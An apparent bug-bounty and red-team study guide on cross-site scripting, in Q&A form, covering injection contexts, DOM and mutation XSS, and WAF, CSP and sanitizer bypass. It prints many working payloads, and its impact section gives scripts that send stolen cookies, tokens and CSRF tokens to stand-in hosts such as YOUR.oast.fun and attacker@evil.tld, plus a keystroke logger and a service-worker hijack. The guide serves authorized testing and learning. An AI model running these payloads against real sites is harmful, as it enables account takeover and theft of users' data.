# Cross-Site Scripting (XSS) — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **XSS** — from "what is it" to account takeover, mutation-XSS &
> DOMPurify bypasses, CSP defeat via script gadgets, prototype-pollution→XSS(→RCE), blind/stored XSS in admin
> contexts, and the full exploitation chains. Q&A format, progressive difficulty. Covers the 7 contexts, DOM XSS,
> WAF/CSP/sanitizer bypass, framework-specific vectors, tooling, methodology, **real-world attacks & CVE classes**,
> and defense — with **high/critical** impact front and center (alert(1) is a *trigger*, not the finding).
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Use a **benign marker**
> (`alert(document.domain)` / an OOB beacon) to prove execution, exfil only to **your own** collector, demonstrate ATO
> on **your own** test accounts, take PoC pages down, and never run a payload against real users. Never test systems
> you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *Cross-site scripting* (+ labs), *DOM-based XSS*, *Prototype pollution*, and research
  ("mXSS", "Bypassing CSP", "XSS in hidden inputs") · the **XSS cheat sheet** (portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- OWASP — *XSS Filter Evasion Cheat Sheet* + *XSS Prevention Cheat Sheet* · PayloadsAllTheThings — *XSS Injection*
- HackTricks — *XSS* · cure53 **DOMPurify** advisories · Google — *"CSP Is Dead, Long Live CSP"* (script gadgets)
- Hackviser & PentesterLab XSS modules · Samy worm (MySpace, 2005) — the canonical stored-XSS worm
- Companion kit in this repo: `Web/XSS/` (guide + payload arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q12)
- **Level 1 — Recon, detection & context identification** (Q13–Q24)
- **Level 2 — Context exploitation (the 7 contexts)** (Q25–Q44)
- **Level 3 — DOM XSS, mXSS, prototype pollution & postMessage** (Q45–Q60)
- **Level 4 — Defense bypass (WAF / CSP / sanitizer / limits)** (Q61–Q78)
- **Level 5 — Impact & expert chains (ATO, admin, persistence)** (Q79–Q96)
- **Tooling** (Q97–Q100)
- **Methodology & triage** (Q101–Q104)
- **Cheat sheets** (Q105–Q108)
- **Real-world attacks & references** (Q109–Q110)
- **Defense — preventing XSS** (Q111–Q114)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is XSS?
A flaw where an application includes **attacker-controlled data in a page without correct context-aware
encoding/sanitization**, so the data is interpreted as **HTML/JavaScript** and **executes in the victim's browser** in
the **target's origin**. Running script in the origin means you can read/modify the page, steal the session/tokens,
and act as the victim → **account takeover**.

### Q2. What are the types of XSS?
- **Reflected** — payload in the request is echoed into the immediate response (needs a delivered link).
- **Stored** — payload is saved server-side and served to other users later (often **0-click**, sometimes hits admins → **Critical**).
- **DOM-based** — the vuln is entirely in **client-side JS** (a source flows to a sink); the payload may never reach the server.
- **Mutation (mXSS)** — sanitized HTML **mutates** into executable script after the browser re-parses it (defeats DOMPurify/sanitizers).
- **Blind** — stored XSS that fires somewhere you can't see (an admin panel, a support tool) → confirmed via OOB.
- **Self-XSS** — only fires in your own session (not a finding alone, unless chained).
- **CSTI** — a client-side template framework (AngularJS/Vue) evaluates `{{}}` → XSS (vs server-side SSTI).

### Q3. Which type pays the most?
**Stored XSS that hits a privileged viewer** (admin/support/moderator) — 0-click, high-impact, often **Critical**
(admin ATO → internal access). Then **stored XSS hitting any user** (mass ATO), **DOM/reflected → ATO**, and **mXSS**
(because it beats sanitizers used by mature apps). Self-XSS alone is **not** a finding.

### Q4. What's the #1 mistake when reporting XSS?
Reporting **`alert(1)`** as the finding. `alert(document.domain)` is a **trigger that proves execution** — the
*finding* is the **impact**: stolen session/token → ATO, CSRF-token theft → forced state change, admin-context
execution → privilege escalation. Lead with the impact, not the popup.

### Q5. Why does XSS pay — what can script in the origin actually do?
Read `document.cookie` (if not HttpOnly), read tokens from `localStorage`/the DOM, make **authenticated same-origin
requests** (`fetch` with the victim's cookies — read responses, steal CSRF tokens, change email/password), keylog,
deface, and (with a permissive cross-origin policy) read other origins' data. It defeats CSRF defenses (it reads the
token) and HttpOnly (it acts *as* the user without needing the cookie value).

### Q6. What's "injection ≠ execution"?
Seeing your input **reflected** in the response is **not** XSS — the browser must **execute** it as script. A marker
that appears HTML-encoded (`&lt;script&gt;`) or inside an attribute that's correctly quoted **doesn't run**. You must
break out of the **exact context** and get the browser to parse your bytes as code. Confirm with a firing
`alert(document.domain)` (or an OOB beacon for blind).

### Q7. What is the source → sink → context model?
- **Source** — where attacker data enters (URL/param, `location.*`, `document.referrer`, `window.name`, `postMessage`, storage, a stored field).
- **Sink** — where data becomes execution (`innerHTML`, `document.write`, `eval`, `setAttribute('href',…)`, server reflection into HTML/JS, …).
- **Context** — *exactly where* in the output your data lands (HTML body / attribute / JS string / URL / CSS / comment / template). **The context decides the payload.**

### Q8. What are the seven contexts (and why memorize them)?
HTML **body** · HTML **attribute** (quoted/unquoted/event-handler) · **JavaScript** (string/template/JSON) · **URL/`href`/`src`** · **CSS/style** · **HTML comment** · **template/framework** (`{{ }}`). Because the **same input is exploitable in some contexts and inert in others** — you craft the breakout for the *specific* context, not a generic `<script>`.

### Q9. Reflected vs stored vs DOM — how do I tell which I have?
**Reflected:** the payload in your request appears in the immediate response. **Stored:** it appears later, in *other*
requests/users (submit, then load elsewhere). **DOM:** view-source shows your payload **not** in the server HTML — it's
written by JS at runtime (often via the URL fragment `#`, which never reaches the server). Check view-source vs the
live DOM (DevTools).

### Q10. What's the mental model?
You're looking for the **gap between where the app puts your data and how that data is interpreted.** Find the context,
break out of it, get the browser to execute, then **escalate to impact** (ATO/admin/CSRF-token theft). The bounty is
the impact chain, not the trigger.

### Q11. What do I need to learn first?
HTML/JS parsing and the 7 contexts; an intercepting proxy (Burp/Caido); browser DevTools (DOM vs source, breakpoints,
DOM Invader); an **OOB listener** (interactsh/Burp Collaborator/XSS-Hunter) for blind XSS and exfil; and the
exploitation primitives (cookie/token theft, authenticated `fetch`, CSRF-token theft).

### Q12. What's the highest-to-lowest impact ordering?
① **Stored XSS in an admin/support context → admin ATO → internal/privilege escalation** — Critical → ② **Stored XSS
hitting any user → mass ATO** — High–Critical → ③ **Reflected/DOM XSS → session/token theft → ATO** — High → ④ **mXSS
defeating a sanitizer → stored XSS** — High → ⑤ *then* reflected XSS needing heavy user interaction, and self-XSS
chains — Medium/Low.

---

# LEVEL 1 — RECON, DETECTION & CONTEXT IDENTIFICATION

### Q13. How do I find the injection surface?
Harvest endpoints + parameters (gau/waybackurls + qsreplace; Arjun/param-miner for hidden params), and the
**non-obvious sources**: HTTP headers (`Referer`, `User-Agent`, `X-Forwarded-Host`), cookies, the URL **fragment**
(`#…`, DOM-only), `window.name`, `postMessage`, file uploads (SVG/HTML), filenames, and anywhere your data is rendered
back (profile/comment/search/error pages).

### Q14. How do I quickly find reflective params?
Tools that flag params reflecting special chars unfiltered: **kxss/Gxss** (`waybackurls | kxss`), **Dalfox** (discover +
verify), and Burp's reflection checks. They surface candidates fast; then you verify the **context** and **execution**
by hand.

### Q15. What's the marker-probe method?
Inject a **unique, neutral marker** (e.g. `xss7f3a9`) and find where it lands in the response/DOM. Then inject a
**character-probe** (`xss7f3a9'"<>` / `'"></tag>`) and observe **which characters survive unencoded** — that tells you
the context and what breakout characters you have.

### Q16. How do I name the context precisely?
Look at the bytes around your marker: are you inside `<tag>…HERE…</tag>` (HTML body), `attr="…HERE…"` (quoted
attribute), `on…="…HERE…"` (event handler), `<script>…"HERE"…</script>` (JS string), `href="HERE"` (URL),
`<style>…HERE…</style>` (CSS), `<!--HERE-->` (comment), or `{{HERE}}` (template)? The surrounding bytes *are* the
context.

### Q17. How do I confirm execution (not just injection)?
Fire `alert(document.domain)` (shows the **origin**, proving same-origin execution — stronger than `alert(1)`), or for
blind/headless contexts, a **beacon** to your OOB host (`new Image().src='//YOUR.oast.fun/x?'+document.domain`). A
firing alert or an OOB hit = confirmed XSS; a reflected-but-encoded marker = not.

### Q18. What are DOM sources and sinks I should grep for?
**Sources:** `location.{hash,search,href}`, `document.{URL,referrer,cookie}`, `window.name`, `URLSearchParams`,
`postMessage` `event.data`, `localStorage`/`sessionStorage`. **Sinks:** `innerHTML`/`outerHTML`, `document.write`,
`insertAdjacentHTML`, `eval`, `setTimeout/setInterval("…")`, `Function()`, `$().html()`,
`dangerouslySetInnerHTML`, `el.setAttribute('href'/'src', …)`, `location=`. (Cross-ref the JS-files kit.)

### Q19. What's the fastest way to find DOM XSS?
Burp's **DOM Invader** (in its built-in browser) auto-instruments sources→sinks and flags exploitable flows + vulnerable
`postMessage` handlers as you browse — far faster than manual tracing in minified code. Confirm the flow fires, then
craft the context-appropriate payload.

### Q20. Why is the URL fragment (`#`) special?
The fragment is **never sent to the server** — so a DOM XSS via `location.hash` **bypasses the server-side WAF
entirely** and isn't visible in server logs. `https://t/page#<img src=x onerror=alert(document.domain)>` is a pure
client-side payload.

### Q21. Stored XSS — how do I test it without spraying?
Submit a **uniquely-marked benign payload** to each stored field (profile/comment/name/file), then **load every place
that field is rendered** (your profile, an admin list, an email, a PDF, a search result). Use a different marker per
field so a later OOB hit tells you **which** input fired (blind XSS, Q56).

### Q22. How do I detect blind XSS?
Plant an **OOB payload** (loads a script from your XSS-Hunter/interactsh host) in fields likely rendered by staff
(support tickets, contact forms, user-agent logs, admin user lists). When an admin views it, your host gets a hit with
**where it fired** (URL, DOM, cookies) — a 0-click admin-context XSS.

### Q23. What's the "fingerprint before you fuzz" idea?
Spend 5 minutes identifying the **framework** (React/Angular/Vue — auto-escaping behavior), the **sanitizer**
(DOMPurify version, sanitize-html), the **CSP** (header / `csp-evaluator`), and how output is encoded. That tells you
which class of bypass to invest in instead of blindly spraying payloads.

### Q24. What's the deliverable from Level 1?
A confirmed **reflection/sink + the exact context + a firing execution** (or an OOB hit for blind), plus knowledge of
the framework/sanitizer/CSP. Now exploit the context (Level 2) and, if blocked, bypass the defenses (Level 4).

---

# LEVEL 2 — CONTEXT EXPLOITATION (THE 7 CONTEXTS)

### Q25. HTML body context — payloads?
You're between tags. Best vectors (short, no-`<script>` needed):
```
<svg onload=alert(document.domain)>      <img src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>   <input autofocus onfocus=alert(document.domain)>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>   <iframe src=javascript:alert(document.domain)>
```
If `<script>` is stripped, `<svg>`/`<math>`/`<details>`/event-handlers often survive — enumerate which tags/attrs the sanitizer misses (Q72).

### Q26. Quoted attribute context — how do I break out?
Close the quote + tag, then inject:
```
"><svg onload=alert(document.domain)>      '><img src=x onerror=alert(1)>
```
If `>` is encoded but the quote isn't, **stay in the tag** and add an event attribute:
```
" autofocus onfocus=alert(document.domain) x="     " onmouseover=alert(1) x="
```

### Q27. Unquoted attribute context?
No quote to close — just add an event handler separated by a space/slash:
```
x onmouseover=alert(document.domain)      /onmouseover=alert(1)      x onfocus=alert(1) autofocus
```

### Q28. Inside an existing event-handler attribute (JS-in-attribute)?
You're already in JS *and* in an HTML attribute — break the JS string and add code; HTML entities decode here:
```
');alert(document.domain)//        '-alert(1)-'        &#39;);alert(1)//        &apos;);alert(1)//
```

### Q29. JS string context — payloads?
Break out of the string and inject statements:
```
";alert(document.domain)//     ';alert(document.domain)//     "-alert(1)-"     '-alert(1)-'
"};alert(1);{"     `${alert(document.domain)}`  (template literal)
</script><svg onload=alert(document.domain)>   (break the whole <script> when < > survive)
```

### Q30. Quotes are escaped but backslash isn't — trick?
Inject a backslash to escape the app's escaping: `\";alert(1)//` → the app's `\"` becomes `\\"` and your `;alert(1)` runs. Backslash-context bugs are common in sloppy JS string building.

### Q31. JSON embedded in a script — how?
Break out of the JSON object and the script string:
```
"};alert(document.domain);var z={"a":"        </script><svg onload=alert(1)>
```

### Q32. URL / `href` / `src` context — payloads?
A `javascript:`/`data:` scheme in a link/`src`:
```
javascript:alert(document.domain)        java%0ascript:alert(1)   java%09script:alert(1)   JaVaScRiPt:alert(1)
data:text/html,<script>alert(document.domain)</script>     data:text/html;base64,PHNjcmlwdD4...
```
Test `returnUrl`/`next`/`redirect`/`url` params and any sink that puts your value in `href`/`src`/`formaction`/`window.open`.

### Q33. CSS / style context — can I get XSS?
Modern browsers don't run JS from CSS directly, but: break out of `<style>` into a tag (`red"></style><svg onload=alert(1)>`), and **CSS-based exfiltration** (no JS) leaks data attribute-by-attribute — useful when CSP blocks JS:
```
input[name=csrf][value^=a]{background:url(//YOUR.oast.fun/leak?c=a)}   /* iterate the alphabet, grow the prefix */
```

### Q34. HTML comment context?
Break out of the comment: `--><svg onload=alert(document.domain)>`. Comments are a common "it's safe in here" mistake.

### Q35. What's a discovery polyglot and when do I use it?
A single payload crafted to fire (or break out) across **many** contexts at once — fire it first to see what survives, then switch to the **minimal** context-correct payload. The classic PortSwigger/0xsobky polyglots cover script/attribute/comment/SVG contexts in one string.

### Q36. Why use the *minimal* context-correct payload for the report?
Because it's the cleanest, most reproducible PoC and least likely to be mangled by the app. The polyglot is for *discovery*; the report uses the precise breakout for *that* context.

### Q37. What's `<svg>`/`<math>` so useful for?
They support event handlers and namespaced content that sanitizers/parsers often mis-handle — `<svg onload=…>`,
`<svg><animate onbegin=…>`, `<math><maction…>` — and they're the workhorses of **mutation XSS** (namespace confusion,
Q52). When `<script>`/`on*` on normal tags are stripped, SVG/MathML vectors frequently survive.

### Q38. How do I exploit XSS in a hidden input?
A hidden input can still be XSS'd via the **accesskey** trick (PortSwigger): inject
`accesskey="X" onclick="alert(document.domain)"` — the victim presses a browser access-key combo to fire it. Niche but a real reflected-XSS-in-hidden-field technique.

### Q39. XSS via `srcdoc` / `iframe`?
`<iframe srcdoc="<script>alert(document.domain)</script>">` runs script in the iframe's context; useful where you can inject an iframe but not direct script. (Mind sandboxing.)

### Q40. What about XSS in a `<noscript>`/`<textarea>`/`<title>`?
You must **close** the special parsing context first: `</title><svg onload=alert(1)>`, `</textarea><img src=x onerror=alert(1)>`, `</noscript><svg onload=alert(1)>`. The sanitizer may forget that closing these RCDATA/raw-text elements re-enables HTML parsing (a mXSS root cause too).

### Q41. How do I handle "my `<` becomes `&lt;` everywhere"?
Then HTML-body/attribute breakout is blocked by encoding. Pivot to: a **JS context** (you may already be in script — no `<` needed), a **DOM sink** (`#fragment` → `innerHTML`, encoding may not apply), a **`javascript:` URL** context, or a **template/CSTI** context. Encoding that's correct for one context is often missing in another.

### Q42. What's CSTI (client-side template injection) and how does it differ from XSS/SSTI?
A client framework evaluates `{{…}}` **in the browser** → XSS. AngularJS (1.x) `{{constructor.constructor('alert(document.domain)')()}}` runs **even when `<` `>` are HTML-encoded** (it's an Angular expression, not HTML). It's an XSS-class bug (vs **server-side** SSTI which computes the math server-side → RCE).

### Q43. Framework-specific vectors (React/Vue/Angular)?
- **React:** `dangerouslySetInnerHTML={{__html:userInput}}`, or `href={userInput}` with `javascript:`/`data:`.
- **Vue:** `v-html` sink; template compilation of user input.
- **AngularJS (1.x):** CSTI `{{constructor.constructor('…')()}}` (Q42).
- **Handlebars/Mustache:** triple-stache `{{{ userInput }}}` renders raw HTML.
- **jQuery (legacy):** `$(location.hash)` / `$('#'+userInput)` (jQuery <1.9 / sink mis-use).

### Q44. The end-state of Level 2?
**Confirmed JS execution** in the target origin via the context-correct breakout (or DOM sink). If the app's WAF/CSP/
sanitizer blocked your payload, go to Level 4; otherwise escalate to impact (Level 5).

---

# LEVEL 3 — DOM XSS, mXSS, PROTOTYPE POLLUTION & POSTMESSAGE

### Q45. How do I exploit DOM XSS?
Trace a controllable **source** to a script-executing **sink**. Classic:
```
https://t/page#<img src=x onerror=alert(document.domain)>      (location.hash → innerHTML)
https://t/page?returnUrl=javascript:alert(document.domain)      (param → location=/href)
```
Confirm the flow fires (DOM Invader / a breakpoint on the sink), then craft the payload for the sink's parsing context.

### Q46. Why is DOM XSS often missed by scanners?
Because the payload may **never reach the server** (fragment/`window.name`/`postMessage`), so server-side scanners and
WAFs don't see it. It lives entirely in client JS — you find it by reading/instrumenting the JS, not by fuzzing the
server.

### Q47. What is mutation XSS (mXSS)?
Sanitized HTML that is **safe as a string** but **mutates into executable script when the browser re-parses it** — a
mismatch between the **sanitizer's** parse and the **browser's** re-parse. It defeats sanitizers (DOMPurify,
sanitize-html) used by mature apps, which makes it **high-value**.

### Q48. What causes mXSS?
Namespace confusion (`<svg>`/`<math>`/`foreignObject`/`mglyph`/`annotation-xml`), RCDATA/raw-text re-parsing
(`<noscript>`/`<style>`/`<title>` boundaries), `template`/CDATA handling, and attribute back-quoting — places where the
serialized DOM, when re-parsed, "moves" a delimiter so inert markup becomes a live `<img onerror>`/`<script>`.

### Q49. Give representative mXSS payload classes.
```
<svg></p><style><a id="</style><img src=1 onerror=alert(document.domain)>">
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></svg>
```
These are **classes** — match the exact bypass to the **library + version** (Q50).

### Q50. How do I find the right mXSS/DOMPurify bypass?
Identify the **bundled DOMPurify version** (from the JS bundle) — many apps pin an old, bypassable one. Check **cure53's
DOMPurify advisories** for that version's known bypass, feed the candidate, and inspect the **post-sanitization DOM**
(DevTools) for a tag/attr the browser re-interprets as script. A working DOMPurify bypass on a major app is a clean
**High** (often → ATO).

### Q51. Which DOMPurify config gaps should I probe?
`ALLOWED_URI_REGEXP` too loose (→ `javascript:`/`data:` slips), `USE_PROFILES:{svg:true}`/`{mathML:true}` (→ namespace
mXSS), `ADD_TAGS`/`ADD_ATTR` custom allowlists (→ a forgotten event handler), and `RETURN_DOM`/re-insertion patterns (→
re-parse mXSS). The config tells you which vector to try.

### Q52. What is client-side prototype pollution → XSS?
When user input writes to `__proto__`/`constructor.prototype`, you taint **every** object. A **gadget** elsewhere (a
library reading an undefined config off a plain object — a template/sanitizer/option) then turns that into DOM XSS:
```
?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>      #__proto__[src]=data:,alert(1)
confirm pollution: Object.prototype.polluted   then find the sink-gadget.
```

### Q53. Can prototype pollution be worse than XSS?
Yes — **server-side** prototype pollution (Node) + a gadget reaching `child_process`/template/`require` → **RCE**
(Critical). Client-side → DOM XSS (High). Identify the vulnerable library/version to pick the gadget. (Cross-ref the
JS-files kit §13.)

### Q54. What is postMessage XSS?
A `window.addEventListener('message', e => { el.innerHTML = e.data })` with **no `event.origin` check** → any site that
frames or `window.open()`s the target can post a script payload into the sink → **cross-origin DOM XSS**:
```html
<iframe src="https://t/page-with-handler" id=f></iframe>
<script>f.onload=()=>f.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')</script>
```

### Q55. Why is no-origin-check postMessage XSS high value?
Because **any** website (an ad, a watering hole) that frames/opens the target can fire it → drive-by ATO of any
logged-in visitor, **no XSS on the target's own pages needed**. It's one of the highest-value JS-only bugs (pair with
the cookie/token-theft PoC, Q80).

### Q56. How do I confirm blind/stored XSS and find where it fired?
Use an OOB payload (XSS-Hunter/interactsh) that, on execution, reports the **firing context** — the URL, the DOM, the
cookies, the user-agent. Plant a **unique marker per input** so the callback tells you *which* field fired and *who*
viewed it (e.g., an admin panel) → 0-click admin-context XSS (Critical).

### Q57. What's a "stored DOM XSS"?
A stored value that's later passed to a **client-side sink** (the server stores it inertly, but the page's JS writes it
to `innerHTML`). It's stored *and* DOM-based — server-side encoding won't help because the JS sink runs after.

### Q58. How do I weaponize XSS in an uploaded file (SVG/HTML)?
An uploaded SVG/HTML/XML served **inline from the app origin** executes JS in that origin → stored XSS (cross-ref the
FileUpload kit §13). `<svg onload=alert(document.domain)>` as `x.svg` fires when rendered inline. If it's served from a
**sandbox domain** (`usercontent.example`) with `Content-Disposition: attachment`, impact drops — check the serving
origin/headers.

### Q59. What is web-messaging/cross-window data leakage (beyond injection)?
A handler that **sends** sensitive data with `postMessage(data,'*')` (wildcard target origin) **leaks** it to any
framing page. Read every `message` handler for both **injection** (no origin check on receive) and **leakage**
(wildcard on send).

### Q60. The end-state of Level 3?
A confirmed DOM/mXSS/postMessage/prototype-pollution XSS (or the recognition that it needs a sanitizer/CSP bypass). Now
defeat the app's defenses (Level 4) and escalate to impact (Level 5).

---

# LEVEL 4 — DEFENSE BYPASS (WAF / CSP / SANITIZER / LIMITS)

### Q61. A WAF blocks my payload — is that the end?
No. Route around the signature: case/structure, encodings, keyword-splitting, no-parentheses, no-spaces, and **moving
the injection** to an input the WAF doesn't inspect (a header, a JSON field, the **fragment** which never reaches the
server, Q20). Filtered XSS is still XSS once evaded.

### Q62. WAF evasion — concrete techniques?
```
case/structure:  <sCrIpT>…</sCrIpT>   <svg/onload=alert(1)>   <img/src/onerror=alert(1)>   <svg<newline>onload=…>
encodings:       %3Cscript%3E…  &#x3c;svg onload=…&#x3e;  <svg onload=&#97;lert(1)>  <img src=x onerror=&#x61;…>
defeat "alert":  top['ale'+'rt'](1)   window['al'+'ert'](1)   eval(atob('YWxlcnQoMSk='))   Function('aler'+'t(1)')()
no parentheses:  <svg onload=alert`1`>   <img src=x onerror=alert`document.domain`>   onerror=window.onerror=alert;throw 1
no spaces:       <svg/onload=alert(1)>   <img/src=x/onerror=alert(1)>
splitting:       <scri<script>pt>alert(1)</scri</script>pt>   (nested-tag re-assembly vs naive stripping)
```

### Q63. How do I beat a CSP?
Read the policy (paste into `csp-evaluator.withgoogle.com`) and find the weak link, in this order:
`'unsafe-inline'`/`'unsafe-eval'` → trivial; **JSONP** on an allow-listed host; a **script gadget** in an allow-listed
framework; missing `base-uri`/`object-src`; a **reused/reflected nonce**; `'strict-dynamic'` + an injectable script
element; and finally **dangling-markup exfil** when scripts are truly blocked.

### Q64. What is a CSP script gadget?
Harmless-looking markup that an **already-allow-listed** JS library auto-executes (Google's "CSP Is Dead"): e.g.
AngularJS `ng-csp`/`ng-bind-html`, RequireJS `data-require`, Knockout/Aurelia/Vue auto-binding attributes. The gadget
reads your injected DOM and executes it — defeating nonce/`strict-dynamic` because the *trusted* library runs your code.

### Q65. How does JSONP bypass CSP?
If an allow-listed host exposes a JSONP endpoint (`?callback=`), `<script src=//allowed/jsonp?callback=alert(document.domain)>`
loads a *trusted-origin* script whose callback is **your** function → execution within the policy. Find a JSONP
endpoint on any `script-src` host.

### Q66. What's the `<base>` / `object-src` CSP gap?
Missing `base-uri` → inject `<base href=//YOUR.attacker/>` to hijack **relative** script loads (the page's own
`<script src=app.js>` now loads from you). Missing/loose `object-src` → `<object>`/`<embed>` vectors. These are common
gaps even in otherwise-tight CSPs.

### Q67. Nonce-based CSP — any bypass?
If the nonce is **reused** across responses, **reflected** in the page, or **predictable**, you can reuse it on your
injected `<script nonce=…>`. Also: a script gadget (Q64) bypasses nonces entirely because the trusted library executes
your DOM.

### Q68. What if scripts are truly blocked (no-JS exfil)?
**Dangling-markup injection**: inject an unterminated tag whose attribute "swallows" the following HTML (including a
CSRF token / secret) and sends it to you:
```
<img src='//YOUR.oast.fun/leak?h=        <form action='//YOUR.oast.fun/leak'><input name=x value='
```
Plus **CSS exfil** (Q33). These leak data/tokens even when JS won't run.

### Q69. `Content-Security-Policy-Report-Only` — does it block XSS?
**No** — report-only mode **does not block** anything; it only reports. Full XSS still runs. Don't treat a
report-only CSP as a mitigation in your report.

### Q70. CSP only on the main page but absent on an API/subpage?
Inject **there** — XSS on an endpoint without the CSP runs freely, and if it's same-origin it still owns the session.
Always check whether the CSP is applied consistently across the app.

### Q71. How do I bypass an HTML sanitizer (not a WAF)?
Identify the sanitizer + version, then: find an **allow-listed tag/attr** that's still dangerous (a bad `href` scheme),
a **namespace/mXSS** mutation (Q47–Q51), a **config gap** (Q51), or a **library-version CVE bypass** (cure53
advisories). The sanitizer's parse ≠ the browser's parse is the root of most bypasses.

### Q72. How do I enumerate what a sanitizer allows?
Feed it tag/attr/scheme probes and inspect the **output DOM**: which tags survive (`svg`/`math`/`details`?), which
attributes (`on*`? `style`? `href`?), which schemes (`javascript:`/`data:`?). The surviving combination that the
browser still executes **is** the bypass.

### Q73. Length-limited input — short payloads?
```
<svg onload=alert()>          <svg/onload=alert()>          <a href=//x onclick=alert()>x
<base href=//YOUR.tld>        (then a relative <script src=app.js> loads from you)
<script src=//YOUR.tld></script>     <svg onload=import('//YOUR.tld')>     <script>eval(name)</script>  (payload via window.name)
```
Use `window.name`/`<base>`/external-load to keep the injected bytes tiny.

### Q74. Charset/encoding tricks?
A missing/incorrect charset can let **UTF-7**/overlong/`\u`-style sequences become `<`/`>` after decoding (`+ADw-script+AD4-`),
or a charset mismatch enable mXSS. Test where the page doesn't pin `charset=utf-8`.

### Q75. Double-encoding / decode-layer mismatch?
If the stack decodes input more than once (or a WAF decodes once, the app twice), double-encode (`%253Cscript%253E`)
so the payload is benign to the WAF and live to the app. Mix encodings to survive one normalization pass.

### Q76. How do I bypass an "alert" / signature-based filter on the *response*?
Rebuild the call so no signatured substring appears: `top['ale'+'rt']`, `eval(atob('…'))`, `Function('aler'+'t(1)')()`,
or use a different sink (`print()`, `confirm()`, `console.log`+breakpoint — but `alert(document.domain)` is best for
the PoC). For the report, prefer a clean `alert(document.domain)` once you've evaded the filter.

### Q77. Self-XSS — how do I turn it into a real finding?
Self-XSS alone is **not** a finding. Chain it: **+ CSRF** (force the victim's browser to submit the self-XSS payload),
**+ a login/CSRF flaw** to set it in the victim's session, **+ request smuggling/cache poisoning** to deliver it, or
escalate a stored "self-only" render to a context a **privileged** user sees.

### Q78. The end-state of Level 4?
Execution that **survives the app's WAF/CSP/sanitizer/limits** on the **production** config. Now escalate to the impact
that pays (Level 5).

---

# LEVEL 5 — IMPACT & EXPERT CHAINS

### Q79. How do I steal a session cookie (when not HttpOnly)?
```js
new Image().src='//YOUR.oast.fun/c?'+encodeURIComponent(document.cookie);
```
Then replay the cookie to log in as the victim → ATO. (Demonstrate with your **own** test account; redact.)

### Q80. The cookie is HttpOnly — is XSS still ATO?
**Yes.** HttpOnly stops you *reading* `document.cookie`, but your script runs **as the user** in the origin — make
**authenticated same-origin requests** to do whatever the user can: steal the **CSRF token** and change email/password,
read account data, perform admin actions. HttpOnly does **not** prevent XSS→ATO.

### Q81. How do I do XSS → account takeover via CSRF-token theft?
```js
fetch('/account',{credentials:'include'}).then(r=>r.text()).then(h=>{
  const t=h.match(/name="csrf"\s+value="([^"]+)"/)[1];
  fetch('/account/email',{method:'POST',credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf='+t+'&email=attacker@evil.tld'});   // own account in PoC → then password reset → ATO
});
```
HttpOnly-proof ATO: read the page, grab the token, change the email → reset password → own the account.

### Q82. How do I steal a token from localStorage / the DOM?
```js
new Image().src='//YOUR.oast.fun/k?'+encodeURIComponent(localStorage.token||document.body.innerText.match(/[A-Za-z0-9_\-]{20,}/)?.[0]);
```
SPAs often store the JWT/session in **localStorage** (XSS-readable) → token theft → ATO (and worth flagging: tokens in
localStorage are XSS-stealable).

### Q83. Why is stored XSS in an admin/support panel the top outcome?
Because it's **0-click** and fires in a **privileged** session — admin cookies/tokens, admin actions (add admin user,
change settings, disable MFA), and internal access. A blind stored XSS that lands in the admin/support tool is the
classic **Critical**. Plant it via support tickets, user-agent logs, profile fields, filenames.

### Q84. How do I demonstrate admin-context XSS safely?
Plant a **benign OOB beacon** (XSS-Hunter) that reports the firing context (admin URL + DOM) when staff view it — that
proves the admin-context execution **without** acting on real admin data. For the report, that callback + the
vulnerable input is sufficient; don't perform real admin actions.

### Q85. What is a self-propagating XSS worm (and why mention it)?
A stored XSS that, on execution, **re-posts itself** to the viewer's own profile/content → spreads user-to-user (the
**Samy worm**, MySpace 2005, hit ~1M users in 20 hours). You'd *never* deploy one in bug bounty — but it illustrates
the **mass-impact** of stored XSS and why it's rated so highly. Demonstrate the *capability* (it can write to your own
profile), not an actual worm.

### Q86. How do I weaponize blind XSS for the report?
The OOB callback **is** the PoC: it shows the payload fired in a context you can't see (admin/support), with the URL,
DOM, and (if not HttpOnly) cookies. State the impact (admin-context execution → admin ATO / internal access) and that
it was a benign beacon.

### Q87. XSS → CSP-protected app — can I still get impact?
Often yes via the bypasses (Level 4): a script gadget or JSONP executes your code despite CSP; or, if JS is truly
blocked, dangling-markup/CSS exfil steals the CSRF token/secret → state change → ATO. CSP raises the bar; it rarely
makes XSS worthless.

### Q88. XSS + permissive CORS → cross-origin secret theft?
If a CORS misconfig lets the target's origin read another API's credentialed response, your XSS (running in the target
origin) can `fetch(... ,{credentials:'include'})` that API and exfil the secret (cross-ref the CORS kit). XSS + CORS =
broader data theft.

### Q89. XSS → service-worker persistence?
```js
navigator.serviceWorker.register('//YOUR.oast.fun/sw.js',{scope:'/'});
```
A registered service worker **persists** across navigations and can **intercept requests** in the origin — a
longer-lived foothold. (Own account only; remove after — and many programs consider this out of scope beyond proof.)

### Q90. XSS → keylogger / BeEF (red-team)?
A keystroke beacon (`document.onkeypress=e=>new Image().src='//YOU/k?'+e.key`) or hooking the page with **BeEF**
demonstrates session-riding capability. For bug bounty, the **ATO/admin** proof is the report — keyloggers/BeEF are
red-team/awareness, not needed for the bounty.

### Q91. Prototype-pollution → XSS → (server) RCE chain?
Client-side prototype pollution → a gadget → DOM XSS (High). **Server-side** (Node) prototype pollution → a gadget
reaching `child_process`/template/`require` → **RCE** (Critical). The same root flaw can be client-XSS or server-RCE
depending on where the merge happens — test both (JS-files kit §13).

### Q92. mXSS/DOMPurify bypass → stored XSS → ATO?
A working DOMPurify/sanitizer bypass on a rich-text/comment feature → **stored** XSS → fires for every viewer (or an
admin) → mass/admin ATO. Because it defeats a *mature* sanitizer, it's a clean High–Critical even though the app
"sanitizes."

